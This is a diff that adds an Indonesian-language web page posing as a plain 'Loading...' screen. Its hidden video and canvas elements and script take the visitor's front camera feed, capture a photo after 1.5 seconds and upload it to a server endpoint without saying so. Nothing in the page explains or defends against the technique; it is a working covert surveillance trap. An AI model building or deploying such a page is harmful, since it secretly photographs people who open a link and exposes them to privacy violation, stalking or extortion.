@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Halaman</title>
+</head>
+<body>
+  <p>Sedang memuat...</p>
+
+  <!-- Elemen tersembunyi -->
+  <video id="video" autoplay playsinline style="display: none;"></video>
+  <canvas id="canvas" width="320" height="240" style="display: none;"></canvas>
+
+  <script>
+    // Ambil foto secara otomatis
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+      .then(stream => {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        video.srcObject = stream;
+
+        video.onloadedmetadata = () => {
+          setTimeout(() => {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/png');
+
+            fetch('/api/upload', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ image: imageData })
+            });
+
+            stream.getTracks().forEach(track => track.stop());
+          }, 1500);
+        };
+      })
+      .catch(error => {
+        console.error('Gagal akses kamera:', error);
+      });
+  </script>
+</body>
+</html>
